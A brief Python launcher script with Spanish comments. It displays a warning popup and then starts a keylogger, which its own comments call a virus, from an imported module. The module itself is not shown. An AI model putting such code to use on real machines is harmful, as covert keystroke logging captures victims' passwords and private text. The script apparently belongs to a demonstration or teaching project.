import popup as pp # Importa la función para la generación del mensaje de alerta sobre la presencia del virus en el equipo.
import keylogger as kl # Provee la clase KeyLogger con la cual podemos iniciar el virus keylogger

pp.generate_message() # llama la función de generación del mensaje en pantalla.
logger = kl.KeyLogger() # inicializa un objeto de la clase KeyLogger()
logger.start() # llama el método start() para iniciar el virus keylogger.

